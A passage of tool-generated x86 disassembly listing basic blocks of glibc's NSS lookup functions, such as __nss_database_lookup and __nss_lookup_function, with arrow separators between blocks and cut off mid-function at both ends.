0xb10c4ea:	shl	eax, 4
0xb10c4ed:	sub	esp, eax
0xb10c4ef:	lea	eax, dword ptr [esp + 0x1d]
0xb10c4f3:	mov	dword ptr [esp + 4], ecx
0xb10c4f7:	lea	edi, dword ptr [esp + 0x18]
0xb10c4fb:	mov	dword ptr [esp + 0x18], 0x73736e5f
0xb10c503:	mov	byte ptr [esp + 0x1c], 0x5f
0xb10c508:	mov	dword ptr [esp], eax
0xb10c50b:	call	0xb07cd00
None
|
|
|
v
0xb10c46a:	mov	esp, dword ptr [ebp - 0x20]
0xb10c46d:	lea	esp, dword ptr [ebp - 0xc]
0xb10c470:	xor	eax, eax
0xb10c472:	pop	ebx
0xb10c473:	pop	esi
0xb10c474:	pop	edi
0xb10c475:	pop	ebp
0xb10c476:	ret	
None
|
|
|
v
0xb10c44e:	mov	edx, dword ptr [ebp - 0x24]
0xb10c451:	mov	dword ptr [edx + 4], eax
0xb10c454:	mov	eax, dword ptr [esi]
0xb10c456:	mov	ecx, dword ptr [eax + 4]
0xb10c459:	test	ecx, ecx
0xb10c45b:	je	0xb10c551
None
|
|
|
v
0xb10c510:	mov	edx, 0x74
0xb10c515:	mov	word ptr [eax + 4], dx
0xb10c519:	mov	dword ptr [eax], 0x696e695f
0xb10c51f:	mov	dword ptr [esp + 4], edi
0xb10c523:	mov	eax, dword ptr [esi]
0xb10c525:	mov	eax, dword ptr [eax + 4]
0xb10c528:	mov	dword ptr [esp], eax
0xb10c52b:	call	0xb123b40
None
|
|
|
v
0xb10c461:	cmp	byte ptr [ebx + 0x31d4], 0
0xb10c468:	jne	0xb10c4c8
None
|
|
|
v
0xb10c585:	mov	eax, dword ptr [esi]
0xb10c587:	mov	dword ptr [eax + 4], 0
0xb10c58e:	mov	eax, dword ptr [esi]
0xb10c590:	mov	ecx, dword ptr [eax + 4]
0xb10c593:	test	ecx, ecx
0xb10c595:	jne	0xb10c46a
None
|
|
|
v
0xb10c551:	mov	dword ptr [esp + 0x14], 0x13
0xb10c559:	mov	dword ptr [esp + 0x10], 2
0xb10c561:	mov	eax, dword ptr [eax]
0xb10c563:	mov	dword ptr [esp + 0xc], eax
0xb10c567:	lea	eax, dword ptr [ebx - 0x4747d]
0xb10c56d:	mov	dword ptr [esp + 8], eax
0xb10c571:	mov	eax, dword ptr [ebp - 0x28]
0xb10c574:	mov	dword ptr [esp], edi
0xb10c577:	mov	dword ptr [esp + 4], eax
0xb10c57b:	call	0xb04d450
None
|
|
|
v
0xb10c5d3:	mov	edx, dword ptr [ebp - 0x1c]
0xb10c5d6:	mov	dword ptr [edx + 4], eax
0xb10c5d9:	jmp	0xb10c58e
None
|
|
|
v
0xb10c35f:	mov	edi, dword ptr [edi + 4]
0xb10c362:	xor	eax, eax
0xb10c364:	test	edi, edi
0xb10c366:	je	0xb10c3c8
None
|
|
|
v
0xb10c534:	mov	edx, dword ptr [ebx + 0x31d0]
0xb10c53a:	ror	edx, 9
0xb10c53d:	xor	edx, dword ptr gs:[0x18]
0xb10c544:	mov	dword ptr [esp], edx
0xb10c547:	call	eax
None
|
|
|
v
0xb10c549:	mov	esp, dword ptr [ebp - 0x24]
0xb10c54c:	jmp	0xb10c46a
None
|
|
|
v
0xb10c3a0:	mov	eax, dword ptr [edi + 8]
0xb10c3a3:	test	eax, eax
0xb10c3a5:	je	0xb10c478
None
|
|
|
v
0xb10c368:	lea	esp, dword ptr [ebp - 0xc]
0xb10c36b:	pop	ebx
0xb10c36c:	pop	esi
0xb10c36d:	pop	edi
0xb10c36e:	pop	ebp
0xb10c36f:	ret	
None
|
|
|
v
0xb10c580:	cmp	dword ptr [ebp - 0x28], eax
0xb10c583:	ja	0xb10c5be
None
|
|
|
v
0xb10c5db:	mov	dword ptr [esi], 0
0xb10c5e1:	jmp	0xb10c4b7
None
|
|
|
v
0xb10c47e:	mov	dword ptr [esp], 0xc
0xb10c485:	call	0xb0173f0
None
|
|
|
v
0xb10c59b:	mov	dword ptr [eax + 4], 0xffffffff
0xb10c5a2:	mov	ecx, dword ptr [ebx - 0xdc]
0xb10c5a8:	mov	eax, dword ptr [ebp - 0x30]
0xb10c5ab:	mov	edx, dword ptr [ebp - 0x2c]
0xb10c5ae:	mov	dword ptr [eax + ecx], edx
0xb10c5b1:	jmp	0xb10c46a
None
|
|
|
v
0xb10c4b7:	mov	eax, 0xffffffff
0xb10c4bc:	jmp	0xb10c368
None
|
|
|
v
0xb10c48a:	test	eax, eax
0xb10c48c:	mov	dword ptr [edi], eax
0xb10c48e:	je	0xb10c5db
None
|
|
|
v
0xb10c530:	test	eax, eax
0xb10c532:	je	0xb10c549
None
|
|
|
v
0xb10c3c8:	mov	eax, dword ptr [ebp - 0x1c]
0xb10c3cb:	mov	dword ptr [ebp - 0x20], esp
0xb10c3ce:	mov	edx, dword ptr [eax]
0xb10c3d0:	mov	dword ptr [esp], edx
0xb10c3d3:	mov	dword ptr [ebp - 0x24], edx
0xb10c3d6:	call	0xb07ae80
None
|
|
|
v
0xb10c370:	mov	eax, dword ptr [edx]
0xb10c372:	lea	edx, dword ptr [ebx + 0x31c8]
0xb10c378:	mov	dword ptr [ebp - 0x20], eax
0xb10c37b:	mov	eax, dword ptr [ebx + 0x31dc]
0xb10c381:	test	eax, eax
0xb10c383:	cmove	eax, edx
0xb10c386:	mov	edi, dword ptr [eax + 4]
0xb10c389:	test	edi, edi
0xb10c38b:	je	0xb10c5b6
None
|
|
|
v
0xb10c3bb:	test	eax, eax
0xb10c3bd:	jne	0xb10c3a0
None
|
|
|
v
0xb10c391:	mov	dword ptr [ebp - 0x24], esi
0xb10c394:	mov	esi, dword ptr [ebp - 0x20]
0xb10c397:	jmp	0xb10c3ad
None
|
|
|
v
0xb10c3db:	mov	edx, dword ptr [ebx - 0xdc]
0xb10c3e1:	lea	ecx, dword ptr [eax + 0xd]
0xb10c3e4:	add	eax, 0x1c
0xb10c3e7:	mov	dword ptr [ebp - 0x28], ecx
0xb10c3ea:	mov	ecx, dword ptr gs:[0]
0xb10c3f1:	and	eax, 0xfffffff0
0xb10c3f4:	sub	esp, eax
0xb10c3f6:	lea	eax, dword ptr [esp + 0x1f]
0xb10c3fa:	mov	dword ptr [esp + 0x18], 0x6e62696c
0xb10c402:	lea	edi, dword ptr [esp + 0x18]
0xb10c406:	mov	dword ptr [ebp - 0x30], ecx
0xb10c409:	mov	ecx, dword ptr [ecx + edx]
0xb10c40c:	mov	edx, dword ptr [ebp - 0x24]
0xb10c40f:	mov	dword ptr [esp + 0x1c], 0x5f7373
0xb10c417:	mov	dword ptr [ebp - 0x2c], ecx
0xb10c41a:	mov	dword ptr [esp + 4], edx
0xb10c41e:	mov	dword ptr [esp], eax
0xb10c421:	call	0xb07cd00
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__nss_database_lookup
TOTAL BLOCKS :75
0xb10c63d:	jne	0xb10cee1
None
|
|
|
v
0xb10cefc:	jmp	0xb10c6b0
None
|
|
|
v
0xb10c76d:	test	eax, eax
0xb10c76f:	mov	dword ptr [esp + 0x28], eax
0xb10c773:	je	0xb10c963
None
|
|
|
v
0xb10c858:	add	edx, 1
0xb10c85b:	movzx	eax, byte ptr [edx]
0xb10c85e:	movsx	ecx, al
0xb10c861:	test	byte ptr [edi + ecx*2 + 1], 0x20
0xb10c866:	jne	0xb10c858
None
|
|
|
v
0xb10c6d0:	mov	edi, dword ptr [edi]
0xb10c6d2:	test	edi, edi
0xb10c6d4:	je	0xb10c700
None
|
|
|
v
0xb10cef1:	lea	eax, dword ptr [ebx + 0x31e0]
0xb10cef7:	call	0xb0f9460
None
|
|
|
v
0xb10c683:	mov	eax, dword ptr [edi + 4]
0xb10c686:	mov	dword ptr [esi], eax
0xb10c688:	mov	edi, dword ptr [edi]
0xb10c68a:	test	edi, edi
0xb10c68c:	jne	0xb10c670
None
|
|
|
v
0xb10c89c:	cmp	ecx, edx
0xb10c89e:	je	0xb10c7e0
None
|
|
|
v
0xb10c6ef:	mov	eax, dword ptr [edi + 4]
0xb10c6f2:	mov	dword ptr [esi], eax
0xb10c6f4:	mov	edi, dword ptr [edi]
0xb10c6f6:	test	edi, edi
0xb10c6f8:	jne	0xb10c6d8
None
|
|
|
v
0xb10c934:	mov	eax, dword ptr [esp + 0x28]
0xb10c938:	mov	dword ptr [esp], eax
0xb10c93b:	call	0xb0634f0
None
|
|
|
v
0xb10c670:	mov	eax, dword ptr [edi + 8]
0xb10c673:	mov	dword ptr [esp], ebp
0xb10c676:	mov	dword ptr [esp + 4], eax
0xb10c67a:	call	0xb07a740
None
|
|
|
v
0xb10c8f5:	mov	dword ptr [edi], 0
0xb10c8fb:	mov	dword ptr [edi + 4], eax
0xb10c8fe:	mov	eax, dword ptr [esp + 0x1c]
0xb10c902:	test	eax, eax
0xb10c904:	je	0xb10c951
None
|
|
|
v
0xb10c81a:	mov	dword ptr [esp], edx
0xb10c81d:	mov	dword ptr [esp + 4], 0x23
0xb10c825:	call	0xb07ee30
None
|
|
|
v
0xb10c7e9:	mov	eax, dword ptr [esp + 0x18]
0xb10c7ed:	mov	dword ptr [esp + 8], esi
0xb10c7f1:	mov	dword ptr [esp + 4], eax
0xb10c7f5:	mov	eax, dword ptr [esp + 0x14]
0xb10c7f9:	mov	dword ptr [esp], eax
0xb10c7fc:	call	0xb055e30
None
|
|
|
v
0xb10c924:	mov	eax, dword ptr [esp + 0x38]
0xb10c928:	mov	esi, dword ptr [esp + 0x6c]
0xb10c92c:	mov	dword ptr [esp], eax
0xb10c92f:	call	0xb017470
None
|
|
|
v
0xb10c65e:	mov	ebp, dword ptr [edi]
0xb10c660:	test	ebp, ebp
0xb10c662:	je	0xb10c692
None
|
|
|
v
0xb10c7e0:	test	byte ptr [esi], 0x10
0xb10c7e3:	jne	0xb10c924
None
|
|
|
v
0xb10c940:	mov	eax, dword ptr [esp + 0x2c]
0xb10c944:	mov	dword ptr [ebx + 0x31dc], eax
0xb10c94a:	mov	edi, eax
0xb10c94c:	jmp	0xb10c65e
None
|
|
|
v
0xb10c8ba:	lea	ebp, dword ptr [eax + 1]
0xb10c8bd:	add	eax, 0xd
0xb10c8c0:	mov	dword ptr [esp], eax
0xb10c8c3:	call	0xb0173f0
None
|
|
|
v
0xb10c6eb:	test	eax, eax
0xb10c6ed:	jne	0xb10c6f4
None
|
|
|
v
0xb10c625:	mov	eax, dword ptr [esi]
0xb10c627:	test	eax, eax
0xb10c629:	je	0xb10c650
None
|
|
|
v
0xb10c6a2:	lock sub	dword ptr [ebx + 0x31e0], 1
None
|
|
|
v
0xb10c6aa:	jne	0xb10cef1
None
|
|
|
v
0xb10c603:	add	ebx, 0x9e9fd
0xb10c609:	mov	esi, dword ptr [esp + 0x6c]
0xb10c60d:	cmp	dword ptr gs:[0xc], 0
0xb10c615:	je	0xb10c618
None
|
|
|
v
0xb10c838:	mov	ecx, dword ptr gs:[0]
0xb10c83f:	mov	edi, dword ptr [ebx - 0x110]
0xb10c845:	mov	edi, dword ptr [ecx + edi]
0xb10c848:	movsx	ecx, al
0xb10c84b:	test	byte ptr [edi + ecx*2 + 1], 0x20
0xb10c850:	je	0xb10c870
None
|
|
|
v
0xb10c6c8:	mov	ebp, dword ptr [esp + 0x64]
0xb10c6cc:	test	ebp, ebp
0xb10c6ce:	je	0xb10c700
None
|
|
|
v
0xb10c809:	mov	edx, dword ptr [esp + 0x38]
0xb10c80d:	lea	eax, dword ptr [edx + eax - 1]
0xb10c811:	cmp	byte ptr [eax], 0xa
0xb10c814:	je	0xb10c918
None
|
|
|
v
0xb10c880:	cmp	al, 0x3a
0xb10c882:	je	0xb10c89c
None
|
|
|
v
0xb10c688:	mov	edi, dword ptr [edi]
0xb10c68a:	test	edi, edi
0xb10c68c:	jne	0xb10c670
None
|
|
|
v
0xb10c5f0:	push	ebp
0xb10c5f1:	xor	eax, eax
0xb10c5f3:	push	edi
0xb10c5f4:	mov	ecx, 1
0xb10c5f9:	push	esi
0xb10c5fa:	push	ebx
0xb10c5fb:	sub	esp, 0x4c
0xb10c5fe:	call	0xb1267db
None
|
|
|
v
0xb10c716:	test	eax, eax
0xb10c718:	mov	dword ptr [esi], eax
0xb10c71a:	je	0xb10c698
None
|
|
|
v
0xb10c72c:	test	eax, eax
0xb10c72e:	je	0xb10c698
None
|
|
|
v
0xb10c698:	cmp	dword ptr gs:[0xc], 0
0xb10c6a0:	je	0xb10c6a3
None
|
|
|
v
0xb10c755:	lea	eax, dword ptr [ebx - 0x4b01c]
0xb10c75b:	mov	dword ptr [esp + 4], eax
0xb10c75f:	lea	eax, dword ptr [ebx - 0x4744e]
0xb10c765:	mov	dword ptr [esp], eax
0xb10c768:	call	0xb063f60
None
|
|
|
v
0xb10c8a4:	lea	eax, dword ptr [ecx + 1]
0xb10c8a7:	mov	byte ptr [ecx], 0
0xb10c8aa:	mov	dword ptr [esp], edx
0xb10c8ad:	mov	dword ptr [esp + 0x24], edx
0xb10c8b1:	mov	dword ptr [esp + 0x20], eax
0xb10c8b5:	call	0xb07ae80
None
|
|
|
v
0xb10c700:	mov	ecx, dword ptr [esp + 0x68]
0xb10c704:	lea	eax, dword ptr [ebx - 0x4746a]
0xb10c70a:	test	ecx, ecx
0xb10c70c:	cmovne	eax, dword ptr [esp + 0x68]
0xb10c711:	call	0xb10bea0
None
|
|
|
v
0xb10c62b:	cmp	dword ptr gs:[0xc], 0
0xb10c633:	je	0xb10c636
None
|
|
|
v
0xb10c68e:	mov	edi, dword ptr [esp + 0x14]
0xb10c692:	mov	eax, dword ptr [esi]
0xb10c694:	test	eax, eax
0xb10c696:	je	0xb10c6c8
None
|
|
|
v
0xb10c868:	test	al, al
0xb10c86a:	je	0xb10c7e0
None
|
|
|
v
0xb10c906:	mov	dword ptr [eax], edi
0xb10c908:	mov	dword ptr [esp + 0x1c], edi
0xb10c90c:	jmp	0xb10c7e0
None
|
|
|
v
0xb10c6d6:	nop	
None
|
|
|
v
0xb10c734:	mov	edx, dword ptr [ebx + 0x31d8]
0xb10c73a:	mov	dword ptr [ebx + 0x31d8], eax
0xb10c740:	mov	dword ptr [eax], edx
0xb10c742:	mov	edx, dword ptr [esi]
0xb10c744:	mov	dword ptr [eax + 4], edx
0xb10c747:	lea	edx, dword ptr [ebx - 0x4aa73]
0xb10c74d:	mov	dword ptr [eax + 8], edx
0xb10c750:	jmp	0xb10c698
None
|
|
|
v
0xb10c884:	add	ecx, 1
0xb10c887:	movzx	eax, byte ptr [ecx]
0xb10c88a:	test	al, al
0xb10c88c:	je	0xb10c7e0
None
|
|
|
v
0xb10c635:	lock sub	dword ptr [ebx + 0x31e0], 1
None
|
|
|
v
0xb10c78b:	test	eax, eax
0xb10c78d:	mov	dword ptr [esp + 0x2c], eax
0xb10c791:	je	0xb10c957
None
|
|
|
v
0xb10c878:	mov	ecx, edx
0xb10c87a:	jmp	0xb10c884
None
|
|
|
v
0xb10c797:	mov	eax, dword ptr [esp + 0x2c]
0xb10c79b:	mov	dword ptr [esp + 0x6c], esi
0xb10c79f:	mov	esi, dword ptr [esp + 0x28]
0xb10c7a3:	mov	dword ptr [esp + 0x38], 0
0xb10c7ab:	mov	dword ptr [esp + 0x3c], 0
0xb10c7b3:	mov	dword ptr [eax], 0
0xb10c7b9:	mov	dword ptr [eax + 4], 0
0xb10c7c0:	lea	eax, dword ptr [esp + 0x3c]
0xb10c7c4:	mov	dword ptr [esp + 0x18], eax
0xb10c7c8:	lea	eax, dword ptr [esp + 0x38]
0xb10c7cc:	mov	dword ptr [esp + 0x1c], 0
0xb10c7d4:	mov	dword ptr [esp + 0x14], eax
0xb10c7d8:	jmp	0xb10c7e9
None
|
|
|
v
0xb10c617:	lock cmpxchg	dword ptr [ebx + 0x31e0], ecx
0xb10c61f:	jne	0xb10ced1
None
|
|
|
v
0xb10c692:	mov	eax, dword ptr [esi]
0xb10c694:	test	eax, eax
0xb10c696:	je	0xb10c6c8
None
|
|
|
v
0xb10c6f4:	mov	edi, dword ptr [edi]
0xb10c6f6:	test	edi, edi
0xb10c6f8:	jne	0xb10c6d8
None
|
|
|
v
0xb10c957:	mov	eax, dword ptr [esp + 0x28]
0xb10c95b:	mov	dword ptr [esp], eax
0xb10c95e:	call	0xb0634f0
None
|
|
|
v
0xb10c650:	mov	edi, dword ptr [ebx + 0x31dc]
0xb10c656:	test	edi, edi
0xb10c658:	je	0xb10c755
None
|
|
|
v
0xb10c6d8:	mov	eax, dword ptr [edi + 8]
0xb10c6db:	mov	dword ptr [esp + 4], eax
0xb10c6df:	mov	eax, dword ptr [esp + 0x64]
0xb10c6e3:	mov	dword ptr [esp], eax
0xb10c6e6:	call	0xb07a740
None
|
|
|
v
0xb10c8d2:	mov	edx, dword ptr [esp + 0x24]
0xb10c8d6:	lea	eax, dword ptr [eax + 0xc]
0xb10c8d9:	mov	dword ptr [edi + 8], eax
0xb10c8dc:	mov	dword ptr [esp + 8], ebp
0xb10c8e0:	mov	dword ptr [esp], eax
0xb10c8e3:	mov	dword ptr [esp + 4], edx
0xb10c8e7:	call	0xb07d0b0
None
|
|
|
v
0xb10c779:	or	dword ptr [eax], 0x8000
0xb10c77f:	mov	dword ptr [esp], 8
0xb10c786:	call	0xb0173f0
None
|
|
|
v
0xb10c892:	movsx	ebp, al
0xb10c895:	test	byte ptr [edi + ebp*2 + 1], 0x20
0xb10c89a:	je	0xb10c880
None
|
|
|
v
0xb10cedc:	jmp	0xb10c625
None
|
|
|
v
0xb10c963:	mov	dword ptr [ebx + 0x31dc], 0
0xb10c96d:	jmp	0xb10c6fa
None
|
|
|
v
0xb10c6fa:	mov	eax, dword ptr [esi]
0xb10c6fc:	test	eax, eax
0xb10c6fe:	jne	0xb10c698
None
|
|
|
v
0xb10c951:	mov	eax, dword ptr [esp + 0x2c]
0xb10c955:	jmp	0xb10c906
None
|
|
|
v
0xb10c870:	cmp	al, 0x3a
0xb10c872:	je	0xb10c7e0
None
|
|
|
v
0xb10c852:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb10c643:	add	esp, 0x4c
0xb10c646:	xor	eax, eax
0xb10c648:	pop	ebx
0xb10c649:	pop	esi
0xb10c64a:	pop	edi
0xb10c64b:	pop	ebp
0xb10c64c:	ret	
None
|
|
|
v
0xb10ced1:	lea	ecx, dword ptr [ebx + 0x31e0]
0xb10ced7:	call	0xb0f9430
None
|
|
|
v
0xb10c8c8:	test	eax, eax
0xb10c8ca:	mov	edi, eax
0xb10c8cc:	je	0xb10c7e0
None
|
|
|
v
0xb10c664:	mov	dword ptr [esp + 0x14], edi
0xb10c668:	mov	edi, ebp
0xb10c66a:	mov	ebp, dword ptr [esp + 0x60]
0xb10c66e:	nop	
0xb10c670:	mov	eax, dword ptr [edi + 8]
0xb10c673:	mov	dword ptr [esp], ebp
0xb10c676:	mov	dword ptr [esp + 4], eax
0xb10c67a:	call	0xb07a740
None
|
|
|
v
0xb10c720:	mov	dword ptr [esp], 0xd
0xb10c727:	call	0xb0173f0
None
|
|
|
v
0xb10ceec:	jmp	0xb10c643
None
|
|
|
v
0xb10c67f:	test	eax, eax
0xb10c681:	jne	0xb10c688
None
|
|
|
v
0xb10c801:	test	eax, eax
0xb10c803:	js	0xb10c924
None
|
|
|
v
0xb10c82a:	mov	byte ptr [eax], 0
0xb10c82d:	mov	edx, dword ptr [esp + 0x38]
0xb10c831:	movzx	eax, byte ptr [edx]
0xb10c834:	test	al, al
0xb10c836:	je	0xb10c7e0
None
|
|
|
v
0xb10c918:	mov	byte ptr [eax], 0
0xb10c91b:	mov	edx, dword ptr [esp + 0x38]
0xb10c91f:	jmp	0xb10c81a
None
|
|
|
v
0xb10c6b0:	mov	edx, dword ptr [esi]
0xb10c6b2:	xor	eax, eax
0xb10c6b4:	test	edx, edx
0xb10c6b6:	sete	al
0xb10c6b9:	add	esp, 0x4c
0xb10c6bc:	pop	ebx
0xb10c6bd:	neg	eax
0xb10c6bf:	pop	esi
0xb10c6c0:	pop	edi
0xb10c6c1:	pop	ebp
0xb10c6c2:	ret	
None
|
|
|
v
0xb10cee1:	lea	eax, dword ptr [ebx + 0x31e0]
0xb10cee7:	call	0xb0f9460
None
|
|
|
v
0xb10c8ec:	mov	eax, dword ptr [esp + 0x20]
0xb10c8f0:	call	0xb10bea0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10c980
TOTAL BLOCKS :7
0xb10c9ab:	mov	eax, dword ptr [esp + 0x1c]
0xb10c9af:	test	eax, eax
0xb10c9b1:	je	0xb10c9d1
None
|
|
|
v
0xb10c980:	sub	esp, 0x2c
0xb10c983:	lea	ecx, dword ptr [esp + 0x1c]
0xb10c987:	mov	dword ptr [esp + 0xc], ecx
0xb10c98b:	mov	dword ptr [esp + 8], edx
0xb10c98f:	mov	dword ptr [esp + 4], 0
0xb10c997:	mov	dword ptr [esp], eax
0xb10c99a:	mov	dword ptr [esp + 0x1c], 0
0xb10c9a2:	call	0xb10c5f0
None
|
|
|
v
0xb10c9b3:	nop	
0xb10c9b4:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb10c9a7:	test	eax, eax
0xb10c9a9:	jne	0xb10c9d1
None
|
|
|
v
0xb10c9c3:	mov	eax, dword ptr [esp + 0x1c]
0xb10c9c7:	mov	eax, dword ptr [eax]
0xb10c9c9:	test	eax, eax
0xb10c9cb:	mov	dword ptr [esp + 0x1c], eax
0xb10c9cf:	jne	0xb10c9b8
None
|
|
|
v
0xb10c9b8:	lea	edx, dword ptr [eax + 0x20]
0xb10c9bb:	add	eax, 0x18
0xb10c9be:	call	0xb10c340
None
|
|
|
v
0xb10c9d1:	add	esp, 0x2c
0xb10c9d4:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__nss_lookup_function
TOTAL BLOCKS :31
0xb10cb95:	mov	eax, dword ptr [ebp + 8]
0xb10cb98:	xor	edx, edx
0xb10cb9a:	mov	eax, dword ptr [eax + 0x18]
0xb10cb9d:	cmp	dword ptr [eax + 4], -1
0xb10cba1:	je	0xb10cc1d
None
|
|
|
v
0xb10cba3:	mov	eax, dword ptr [ebp + 8]
0xb10cba6:	mov	dword ptr [ebp - 0x1c], esp
0xb10cba9:	mov	esi, dword ptr [eax + 0x20]
0xb10cbac:	mov	dword ptr [esp], esi
0xb10cbaf:	call	0xb07ae80
None
|
|
|
v
0xb10cb1f:	mov	eax, dword ptr [eax]
0xb10cb21:	cmp	eax, esi
0xb10cb23:	je	0xb10cb58
None
|
|
|
v
0xb10cbee:	mov	edx, dword ptr [ebp - 0x24]
0xb10cbf1:	mov	byte ptr [eax], 0x5f
0xb10cbf4:	add	eax, 1
0xb10cbf7:	mov	dword ptr [esp + 4], edx
0xb10cbfb:	mov	dword ptr [esp], eax
0xb10cbfe:	call	0xb07a810
None
|
|
|
v
0xb10cc38:	xor	edx, edx
0xb10cc3a:	jmp	0xb10cb32
None
|
|
|
v
0xb10cb58:	mov	dword ptr [ebp - 0x24], edx
0xb10cb5b:	mov	dword ptr [esp], 8
0xb10cb62:	call	0xb0173f0
None
|
|
|
v
0xb10cc03:	mov	dword ptr [esp + 4], edi
0xb10cc07:	mov	eax, dword ptr [ebp + 8]
0xb10cc0a:	mov	eax, dword ptr [eax + 0x18]
0xb10cc0d:	mov	eax, dword ptr [eax + 4]
0xb10cc10:	mov	dword ptr [esp], eax
0xb10cc13:	call	0xb123b40
None
|
|
|
v
0xb10caf3:	mov	eax, dword ptr [ebp + 8]
0xb10caf6:	lea	edi, dword ptr [ebx - 0x9f1a0]
0xb10cafc:	lea	esi, dword ptr [ebp + 0xc]
0xb10caff:	add	eax, 0x1c
0xb10cb02:	mov	dword ptr [ebp - 0x1c], eax
0xb10cb05:	mov	dword ptr [esp + 8], edi
0xb10cb09:	mov	dword ptr [esp + 4], eax
0xb10cb0d:	mov	dword ptr [esp], esi
0xb10cb10:	call	0xb0e7d80
None
|
|
|
v
0xb10cc1d:	mov	edi, dword ptr [ebp - 0x20]
0xb10cc20:	mov	eax, edx
0xb10cc22:	xor	eax, dword ptr gs:[0x18]
0xb10cc29:	rol	eax, 9
0xb10cc2c:	mov	dword ptr [edi + 4], eax
0xb10cc2f:	jmp	0xb10cb32
None
|
|
|
v
0xb10cb8d:	test	eax, eax
0xb10cb8f:	jne	0xb10cc40
None
|
|
|
v
0xb10cbb4:	mov	edx, dword ptr [ebp + 0xc]
0xb10cbb7:	mov	dword ptr [esp], edx
0xb10cbba:	mov	dword ptr [ebp - 0x24], edx
0xb10cbbd:	mov	edi, eax
0xb10cbbf:	call	0xb07ae80
None
|
|
|
v
0xb10cb67:	mov	edx, dword ptr [ebp - 0x24]
0xb10cb6a:	test	eax, eax
0xb10cb6c:	mov	dword ptr [ebp - 0x20], eax
0xb10cb6f:	je	0xb10cc40
None
|
|
|
v
0xb10cb44:	jne	0xb10cf31
None
|
|
|
v
0xb10cb4a:	lea	esp, dword ptr [ebp - 0xc]
0xb10cb4d:	mov	eax, edx
0xb10cb4f:	pop	ebx
0xb10cb50:	pop	esi
0xb10cb51:	pop	edi
0xb10cb52:	pop	ebp
0xb10cb53:	ret	
None
|
|
|
v
0xb10cc40:	mov	dword ptr [esp + 8], edi
0xb10cc44:	mov	eax, dword ptr [ebp - 0x1c]
0xb10cc47:	mov	dword ptr [esp], esi
0xb10cc4a:	mov	dword ptr [esp + 4], eax
0xb10cc4e:	call	0xb0e7f40
None
|
|
|
v
0xb10cb3c:	lock sub	dword ptr [ebx + 0x31e0], 1
None
|
|
|
v
0xb10cf2c:	jmp	0xb10caf3
None
|
|
|
v
0xb10cb25:	mov	edx, dword ptr [eax + 4]
0xb10cb28:	ror	edx, 9
0xb10cb2b:	xor	edx, dword ptr gs:[0x18]
0xb10cb32:	cmp	dword ptr gs:[0xc], 0
0xb10cb3a:	je	0xb10cb3d
None
|
|
|
v
0xb10cc5e:	xor	edx, edx
0xb10cc60:	jmp	0xb10cb32
None
|
|
|
v
0xb10cf3c:	jmp	0xb10cb4a
None
|
|
|
v
0xb10cc18:	mov	esp, dword ptr [ebp - 0x1c]
0xb10cc1b:	mov	edx, eax
0xb10cc1d:	mov	edi, dword ptr [ebp - 0x20]
0xb10cc20:	mov	eax, edx
0xb10cc22:	xor	eax, dword ptr gs:[0x18]
0xb10cc29:	rol	eax, 9
0xb10cc2c:	mov	dword ptr [edi + 4], eax
0xb10cc2f:	jmp	0xb10cb32
None
|
|
|
v
0xb10cf31:	lea	eax, dword ptr [ebx + 0x31e0]
0xb10cf37:	call	0xb0f9460
None
|
|
|
v
0xb10cae5:	lock cmpxchg	dword ptr [ebx + 0x31e0], ecx
0xb10caed:	jne	0xb10cf21
None
|
|
|
v
0xb10cad5:	add	ebx, 0x9e52b
0xb10cadb:	cmp	dword ptr gs:[0xc], 0
0xb10cae3:	je	0xb10cae6
None
|
|
|
v
0xb10cc53:	mov	eax, dword ptr [ebp - 0x20]
0xb10cc56:	mov	dword ptr [esp], eax
0xb10cc59:	call	0xb017470
None
|
|
|
v
0xb10cb75:	mov	ecx, dword ptr [ebp - 0x20]
0xb10cb78:	mov	dword ptr [edx], ecx
0xb10cb7a:	mov	eax, dword ptr [ebp + 0xc]
0xb10cb7d:	mov	dword ptr [ecx], eax
0xb10cb7f:	mov	eax, dword ptr [ebp + 8]
0xb10cb82:	lea	edx, dword ptr [eax + 0x20]
0xb10cb85:	add	eax, 0x18
0xb10cb88:	call	0xb10c340
None
|
|
|
v
0xb10cbc4:	lea	eax, dword ptr [edi + eax + 0x16]
0xb10cbc8:	and	eax, 0xfffffff0
0xb10cbcb:	sub	esp, eax
0xb10cbcd:	lea	eax, dword ptr [esp + 0x11]
0xb10cbd1:	mov	dword ptr [esp + 0xc], 0x73736e5f
0xb10cbd9:	lea	edi, dword ptr [esp + 0xc]
0xb10cbdd:	mov	byte ptr [esp + 0x10], 0x5f
0xb10cbe2:	mov	dword ptr [esp + 4], esi
0xb10cbe6:	mov	dword ptr [esp], eax
0xb10cbe9:	call	0xb07cd00
None
|
|
|
v
0xb10cf21:	lea	ecx, dword ptr [ebx + 0x31e0]
0xb10cf27:	call	0xb0f9430
None
|
|
|
v
0xb10cac0:	push	ebp
0xb10cac1:	xor	eax, eax
0xb10cac3:	mov	ebp, esp
0xb10cac5:	mov	ecx, 1
0xb10caca:	push	edi
0xb10cacb:	push	esi
0xb10cacc:	push	ebx
0xb10cacd:	sub	esp, 0x2c
0xb10cad0:	call	0xb1267db
None
|
|
|
v
0xb10cb15:	test	eax, eax
0xb10cb17:	mov	edx, eax
0xb10cb19:	je	0xb10cc38
None
|
|
|
v
0xb10cb32:	cmp	dword ptr gs:[0xc], 0
0xb10cb3a:	je	0xb10cb3d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__nss_lookup
TOTAL BLOCKS :17
0xb10ccad:	mov	eax, dword ptr [eax]
0xb10ccaf:	test	eax, eax
0xb10ccb1:	je	0xb10cd10
None
|
|
|
v
0xb10cd20:	mov	edx, dword ptr [esp + 0x28]
0xb10cd24:	test	edx, edx
0xb10cd26:	jne	0xb10cccf
None
|
|
|
v
0xb10cca4:	mov	eax, dword ptr [esi]
0xb10cca6:	mov	edx, dword ptr [eax + 8]
0xb10cca9:	test	edx, edx
0xb10ccab:	jne	0xb10ccf8
None
|
|
|
v
0xb10cc90:	test	eax, eax
0xb10cc92:	mov	dword ptr [edi], eax
0xb10cc94:	je	0xb10cd20
None
|
|
|
v
0xb10cce7:	nop	
None
|
|
|
v
0xb10cd10:	add	esp, 0x10
0xb10cd13:	mov	al, 1
0xb10cd15:	pop	esi
0xb10cd16:	pop	edi
0xb10cd17:	pop	ebp
